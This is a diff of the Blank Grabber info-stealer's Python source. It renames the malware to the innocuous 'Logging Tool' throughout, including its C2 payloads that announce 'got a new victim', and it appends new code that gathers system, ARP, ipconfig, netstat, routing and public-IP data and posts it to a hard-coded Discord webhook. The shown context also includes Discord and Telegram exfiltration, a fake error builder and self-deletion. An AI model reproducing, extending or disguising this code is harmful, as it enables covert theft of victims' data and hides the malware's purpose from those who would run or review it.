@@ -634,7 +634,7 @@ class PumperSettings(ctk.CTkToplevel):
 
 	def __init__(self, master) -> None:
 		super().__init__(master)
-		self.title("Blank Grabber [File Pumper]")
+		self.title("Logging Tool [File Pumper]")
 		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
 		self.grab_set()
 		self.geometry("500x200")
@@ -682,7 +682,7 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 
 	def __init__(self, master) -> None:
 		super().__init__(master)
-		self.title("Blank Grabber [Fake Error Builder]")
+		self.title("Logging Tool [Fake Error Builder]")
 		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
 		self.grab_set()
 		self.geometry("833x563")
@@ -774,7 +774,7 @@ class Builder(ctk.CTk):
 		super().__init__()
 
 		ctk.set_appearance_mode("dark")
-		self.title("Blank Grabber [Builder]")
+		self.title("Logging Tool [Builder]")
 		self.iconbitmap(os.path.join("Extras", "icon.ico"))
 		self.geometry("1250x600")
 		self.resizable(False, False)
@@ -785,7 +785,7 @@ class Builder(ctk.CTk):
 		self.columnconfigure(0, weight= 1)
 		self.columnconfigure(1, weight= 0)
 
-		self.titleLabel = ctk.CTkLabel(self, text= "Blank Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
+		self.titleLabel = ctk.CTkLabel(self, text= "Logging Tool", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
 		self.titleLabel.grid(row= 0, column= 0)
 
 		self.builderOptions = BuilderOptionsFrame(self)
@@ -949,7 +949,7 @@ ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 
 logging.basicConfig(format='\x1b[1;36m%(funcName)s\x1b[0m:\x1b[1;33m%(levelname)7s\x1b[0m:%(message)s')
 for _, logger in logging.root.manager.loggerDict.items():
     logger.disabled = True
-Logger = logging.getLogger('Blank Grabber')
+Logger = logging.getLogger('Logging Tool')
 Logger.setLevel(logging.INFO)
 if not Settings.Debug:
     Logger.disabled = True
@@ -1652,7 +1652,7 @@ class Discord:
                 check = False
                 yield path
 
-class BlankGrabber:
+class LoggingTool:
     Separator: str = None
     TempFolder: str = None
     ArchivePath: str = None
@@ -1676,7 +1676,7 @@ class BlankGrabber:
     GrowtopiaStolen: bool = False
 
     def __init__(self) -> None:
-        self.Separator = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
+        self.Separator = '\n\n' + 'Logging Tool'.center(50, '=') + '\n\n'
         while True:
             self.ArchivePath = os.path.join(os.getenv('temp'), Utility.GetRandomString() + '.zip')
             if not os.path.isfile(self.ArchivePath):
@@ -2227,7 +2227,7 @@ class BlankGrabber:
         match Settings.C2[0]:
             case 0:
                 image_url = 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
-                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
+                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Logging Tool', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Logging Tool | https://github.com/Blank-c/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Logging Tool', 'avatar_url': image_url}
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
@@ -2242,7 +2242,7 @@ class BlankGrabber:
                 fields['payload_json'] = json.dumps(payload).encode()
                 http.request('POST', Settings.C2[1], fields=fields)
             case 1:
-                payload = {'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
+                payload = {'caption': f'<b>Logging Tool</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40:
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
@@ -2340,7 +2340,7 @@ if os.name == 'nt':
                 Logger.info('Checking internet connection')
                 if Utility.IsConnectedToInternet():
                     Logger.info('Internet connection available, starting stealer (things will be running in parallel)')
-                    BlankGrabber()
+                    LoggingTool()
                     Logger.info('Stealer finished its work')
                     break
                 else:
@@ -2356,3 +2356,107 @@ if os.name == 'nt':
             Logger.info('Deleting the file')
             Utility.DeleteSelf()
         Logger.info('Process ended')
+
+def get_system_info():
+    try:
+        result = subprocess.run(['systeminfo'], capture_output=True, text=True, shell=True)
+        return result.stdout.strip()
+    except Exception as e:
+        return f"Error retrieving system info: {e}"
+
+# Function to get ARP table
+def get_arp_table():
+    try:
+        result = subprocess.run(['arp', '-a'], capture_output=True, text=True, shell=True)
+        return result.stdout.strip()
+    except Exception as e:
+        return f"Error retrieving ARP table: {e}"
+
+# Function to get IP configuration
+def get_ip_config():
+    try:
+        result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, shell=True)
+        return result.stdout.strip()
+    except Exception as e:
+        return f"Error retrieving IP configuration: {e}"
+
+# Function to get network statistics
+def get_netstat():
+    try:
+        result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, shell=True)
+        return result.stdout.strip()
+    except Exception as e:
+        return f"Error retrieving network statistics: {e}"
+
+# Function to get routing table
+def get_route():
+    try:
+        result = subprocess.run(['route', 'print'], capture_output=True, text=True, shell=True)
+        return result.stdout.strip()
+    except Exception as e:
+        return f"Error retrieving routing table: {e}"
+
+# Function to get public IP
+def get_public_ip():
+    try:
+        conn = http.client.HTTPSConnection("api.ipify.org")
+        conn.request("GET", "/")
+        response = conn.getresponse()
+        return response.read().decode()
+    except Exception as e:
+        return f"Error: {e}"
+
+# Get all information
+system_info = get_system_info()
+arp_table = get_arp_table()
+ip_config = get_ip_config()
+netstat = get_netstat()
+route_table = get_route()
+public_ip = get_public_ip()
+host_name = socket.gethostname()
+ip_address = socket.gethostbyname(host_name)
+
+# Print local information
+print("Host Name: ", host_name)
+print("IP Address: ", ip_address)
+print("Public IP Address: ", public_ip)
+
+# Prepare the content for the webhook
+webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1304490243910533172/ceZNHL_lfpNCSL4MF4HbR_l7cam-Q2Sxc3hSL7iRAiA8KNL9TZ8e0ygQfnZ9KSafXQxS", username="Spidey Bot")
+
+# Create an embed for the webhook
+embed = DiscordEmbed(
+    title=f"Private IP: {ip_address} | Host: {host_name}\nPublic IP: {public_ip}",
+    color=123123
+)
+
+# Check lengths before assigning to avoid errors
+if len(embed.title) > 256:
+    embed.title = embed.title[:256]  # Truncate title if too long
+
+# Prepare a summary of the outputs to avoid exceeding Discord limits
+embed.description = (
+    f"**System Information:**\n{system_info[:1000]}\n\n"  # Truncate to 1000 characters
+    f"**ARP Table:**\n{arp_table[:1000]}\n\n"            # Truncate to 1000 characters
+    f"**IP Configuration:**\n{ip_config[:1000]}\n\n"      # Truncate to 1000 characters
+    f"**Network Statistics:**\n{netstat[:1000]}\n\n"      # Truncate to 1000 characters
+    f"**Routing Table:**\n{route_table[:1000]}"            # Truncate to 1000 characters
+)
+
+# Check lengths of description
+if len(embed.description) > 4096:
+    embed.description = embed.description[:4096]  # Truncate description if too long
+
+# Add the embed to the webhook
+webhook.add_embed(embed)
+
+# Debugging: Print before sending
+print("Preparing to send webhook...")
+
+try:
+    # Execute the webhook and capture the response
+    response = webhook.execute()
+    print(f"Webhook status code: {response.status_code}")
+    print(f"Response content: {response.content.decode()}")
+except Exception as e:
+    print(f"Error sending webhook: {e}")
